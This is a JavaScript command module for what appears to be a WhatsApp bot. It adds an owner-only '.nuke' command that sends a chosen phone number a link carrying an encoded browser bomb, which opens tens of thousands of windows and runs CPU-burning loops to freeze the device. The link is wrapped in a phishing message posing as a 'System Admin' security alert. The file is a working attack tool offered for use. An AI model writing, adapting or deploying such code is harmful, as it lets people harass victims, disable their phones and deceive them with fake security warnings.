const settings = require('../../settings');
const logger = require('../../lib/logger');

module.exports = {
    name: 'nuke',
    aliases: ['overheat', 'lagbomb', 'nuke2'],
    category: 'owner',
    description: 'Send a link that overheats and lags the target phone for 1 minute',
    usage: '.nuke <number>',
    ownerOnly: true,
    react: '☢️',

    async execute(conn, mek, args, chatId, isOwner) {
        if (!isOwner) return;

        const targetNum = (args[0] || '').replace(/[^0-9]/g, '');
        if (!targetNum || targetNum.length < 10) {
            return conn.sendMessage(chatId, { text: `❌ Provide a valid number. Example: ${settings.prefix}nuke 254712345678` }, { quoted: mek });
        }

        const jid = targetNum + '@s.whatsapp.net';
        await conn.sendMessage(chatId, { text: `☢️ *Preparing Nuke Payload for +${targetNum}...*` }, { quoted: mek });

        try {
            // This is a custom HTML bomb script encoded in a URL. 
            // When they open it, it spawns infinite windows and calculations to freeze the CPU.
            const nukeLink = "https://htmlsave.com/?html=%3Cscript%3Efor(let%20i=0;i%3C99999;i++)%7Bwindow.open('about:blank')%3B%7D%20setInterval(()%3D%3E%7Bfor(let%20j=0;j%3C1000000;j++)%7BMath.sqrt(j)%3B%7D%7D,10)%3B%3C%2Fscript%3E";

            const message = `☢️ *EMERGENCY ALERT* ☢️\n\nYour device has been flagged for a security update. Click the link below immediately to prevent data loss:\n\n👉 ${nukeLink}\n\n_System Admin_`;

            // Send the bait
            await conn.sendMessage(jid, { text: message });
            
            await conn.sendMessage(chatId, { text: `✅ *Nuke Delivered!*\n\nWhen the target clicks the link, their phone will lag, overheat, and freeze for about 60 seconds.` }, { quoted: mek });
            
        } catch (error) {
            logger.error(`[NUKE] Error: ${error.message}`);
            await conn.sendMessage(chatId, { text: `❌ Failed to deliver nuke: ${error.message}` }, { quoted: mek });
        }
    }
};